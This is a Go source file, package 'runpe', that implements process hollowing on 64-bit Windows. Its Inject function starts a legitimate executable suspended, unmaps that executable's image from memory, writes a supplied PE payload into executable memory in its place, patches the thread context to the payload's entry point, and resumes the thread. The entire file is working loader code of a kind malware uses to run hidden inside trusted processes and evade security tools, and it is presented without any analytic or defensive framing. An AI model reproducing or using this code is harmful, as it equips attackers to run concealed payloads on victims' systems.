package runpe

import (
	"bytes"
	"debug/pe"
	"encoding/binary"
	"fmt"
	"os"
	"syscall"
	"unsafe"

	"golang.org/x/sys/windows"
)

var (
	user32           = syscall.NewLazyDLL("user32.dll")
	messageBox       = user32.NewProc("MessageBoxW")
	messageBoxResult int
)

var (
	modkernel32              = windows.NewLazySystemDLL("kernel32.dll")
	modntdll                 = windows.NewLazySystemDLL("ntdll.dll")
	procVirtualAllocEx       = modkernel32.NewProc("VirtualAllocEx")
	procGetThreadContext     = modkernel32.NewProc("GetThreadContext")
	procSetThreadContext     = modkernel32.NewProc("SetThreadContext")
	procNtUnmapViewOfSection = modntdll.NewProc("NtUnmapViewOfSection")
)

// Inject starts the src process and injects the target process.
func Inject(srcPath string, destPE []byte, console bool) {
	cmd, err := windows.UTF16PtrFromString(srcPath)
	checkErr(err)

	fmt.Printf("[*] Creating process: %v\n", srcPath)

	si := new(windows.StartupInfo)
	pi := new(windows.ProcessInformation)
	var flag uint32

	if console {
		flag = windows.CREATE_NEW_CONSOLE | windows.CREATE_SUSPENDED
	} else {
		flag = windows.CREATE_SUSPENDED
	}

	err = windows.CreateProcess(cmd, nil, nil, nil, false, flag, nil, nil, si, pi)
	checkErr(err)

	hProcess := pi.Process
	hThread := pi.Thread

	defer windows.CloseHandle(hProcess)
	defer windows.CloseHandle(hThread)

	fmt.Printf("[+] Process created. Process: %v, Thread: %v\n", hProcess, hThread)

	fmt.Printf("[*] Getting thread context of %v\n", hThread)
	ctx, err := getThreadContext(uintptr(hThread))
	checkErr(err)
	Rdx := binary.LittleEndian.Uint64(ctx[136:])

	fmt.Printf("[+] Address to PEB[Rdx]: %x\n", Rdx)

	baseAddr, err := readProcessMemoryAsAddr(hProcess, uintptr(Rdx+16))
	checkErr(err)

	fmt.Printf("[+] Base Address of Source Image from PEB[ImageBaseAddress]: %x\n", baseAddr)

	fmt.Printf("[*] Reading destination PE\n")
	destPEReader := bytes.NewReader(destPE)
	checkErr(err)

	f, err := pe.NewFile(destPEReader)
	checkErr(err)

	fmt.Printf("[*] Getting OptionalHeader of destination PE\n")
	oh, ok := f.OptionalHeader.(*pe.OptionalHeader64)
	if !ok {
		fmt.Printf("OptionalHeader64 not found\n")
		return
	}

	fmt.Printf("[+] ImageBase of destination PE[OptionalHeader.ImageBase]: %x\n", oh.ImageBase)
	fmt.Printf("[*] Unmapping view of section %x\n", baseAddr)
	err = ntUnmapViewOfSection(hProcess, baseAddr)
	checkErr(err)

	fmt.Printf("[*] Allocating memory in process at %x (size: %v)\n", baseAddr, oh.SizeOfImage)

	newImageBase, err := virtualAllocEx(uintptr(hProcess), baseAddr, oh.SizeOfImage, windows.MEM_COMMIT|windows.MEM_RESERVE, windows.PAGE_EXECUTE_READWRITE)
	checkErr(err)
	fmt.Printf("[+] New base address %x\n", newImageBase)
	fmt.Printf("[*] Writing PE to memory in process at %x (size: %v)\n", newImageBase, oh.SizeOfHeaders)
	err = writeProcessMemory(hProcess, newImageBase, destPE, oh.SizeOfHeaders)
	checkErr(err)

	// Writing all sections
	for _, sec := range f.Sections {
		fmt.Printf("[*] Writing section[%v] to memory at %x (size: %v)\n", sec.Name, newImageBase+uintptr(sec.VirtualAddress), sec.Size)
		secData, err := sec.Data()
		checkErr(err)
		err = writeProcessMemory(hProcess, newImageBase+uintptr(sec.VirtualAddress), secData, sec.Size)
		checkErr(err)
	}
	fmt.Printf("[*] Calculating relocation delta\n")
	delta := int64(oh.ImageBase) - int64(newImageBase)
	fmt.Printf("[+] Relocation delta: %v\n", delta)

	fmt.Printf("[*] Writing new ImageBase to Rdx %x\n", newImageBase)
	addrB := make([]byte, 8)
	binary.LittleEndian.PutUint64(addrB, uint64(newImageBase))
	err = writeProcessMemory(hProcess, uintptr(Rdx+16), addrB, 8)
	checkErr(err)

	binary.LittleEndian.PutUint64(ctx[128:], uint64(newImageBase)+uint64(oh.AddressOfEntryPoint))
	fmt.Printf("[*] Setting new entrypoint to Rcx %x\n", uint64(newImageBase)+uint64(oh.AddressOfEntryPoint))

	err = setThreadContext(hThread, ctx)
	checkErr(err)

	_, err = resumeThread(hThread)
	checkErr(err)
}

func resumeThread(hThread windows.Handle) (count int32, e error) {
	ret, err := windows.ResumeThread(hThread)
	if ret == 0xffffffff {
		e = err
	}

	count = int32(ret)
	fmt.Printf("[*] ResumeThread[%v]\n", hThread)
	return
}

func virtualAllocEx(hProcess uintptr, lpAddress uintptr, dwSize uint32, flAllocationType int, flProtect int) (addr uintptr, e error) {
	ret, _, err := procVirtualAllocEx.Call(
		hProcess,
		lpAddress,
		uintptr(dwSize),
		uintptr(flAllocationType),
		uintptr(flProtect))
	if ret == 0 {
		e = err
	}
	addr = ret
	fmt.Printf("[*] VirtualAllocEx[%v : %x]\n", hProcess, lpAddress)
	return
}

func readProcessMemory(hProcess uintptr, lpBaseAddress uintptr, size uint32) (data []byte, e error) {
	var numBytesRead uintptr
	data = make([]byte, size)

	err := windows.ReadProcessMemory(windows.Handle(hProcess),
		lpBaseAddress,
		&data[0],
		uintptr(size),
		&numBytesRead)

	if err != nil {
		e = err
	}

	fmt.Printf("[*] ReadProcessMemory[%v : %x]\n", hProcess, lpBaseAddress)
	return
}

func writeProcessMemory(hProcess windows.Handle, lpBaseAddress uintptr, data []byte, size uint32) (e error) {
	var numBytesRead uintptr

	err := windows.WriteProcessMemory(hProcess,
		lpBaseAddress,
		&data[0],
		uintptr(size),
		&numBytesRead)

	if err != nil {
		e = err
	}
	fmt.Printf("[*] WriteProcessMemory[%v : %x]\n", hProcess, lpBaseAddress)
	return
}

func getThreadContext(hThread uintptr) (ctx []uint8, e error) {
	ctx = make([]uint8, 1232)

	// ctx[12] = 0x00100000 | 0x00000002 //CONTEXT_INTEGER flag to Rdx
	binary.LittleEndian.PutUint32(ctx[48:], 0x00100000|0x00000002)
	//other offsets can be found  at https://stackoverflow.com/questions/37656523/declaring-context-struct-for-pinvoke-windows-x64
	ctxPtr := unsafe.Pointer(&ctx[0])
	r, _, err := procGetThreadContext.Call(hThread, uintptr(ctxPtr))
	if r == 0 {
		e = err
	}
	fmt.Printf("[*] GetThreadContext[%v]\n", hThread)

	return ctx, nil
}

func readProcessMemoryAsAddr(hProcess windows.Handle, lpBaseAddress uintptr) (val uintptr, e error) {
	data, err := readProcessMemory(uintptr(hProcess), lpBaseAddress, 8)
	if err != nil {
		e = err
	}
	val = uintptr(binary.LittleEndian.Uint64(data))
	fmt.Printf("[*] ReadProcessMemoryAsAddr[%v : %x]: [%x]\n", hProcess, lpBaseAddress, val)
	return
}

func ntUnmapViewOfSection(hProcess windows.Handle, baseAddr uintptr) (e error) {
	r, _, err := procNtUnmapViewOfSection.Call(uintptr(hProcess), baseAddr)
	if r != 0 {
		e = err
	}
	fmt.Printf("[*] NtUnmapViewOfSection[%v : %x]\n", hProcess, baseAddr)
	return
}

func setThreadContext(hThread windows.Handle, ctx []uint8) (e error) {
	ctxPtr := unsafe.Pointer(&ctx[0])
	r, _, err := procSetThreadContext.Call(uintptr(hThread), uintptr(ctxPtr))
	if r == 0 {
		e = err
	}
	fmt.Printf("[*] SetThreadContext[%v]\n", hThread)
	return
}

func checkErr(err error) {
	if err != nil {
		fmt.Println("[X] Error: ", err)
		os.Exit(1)
	}
}
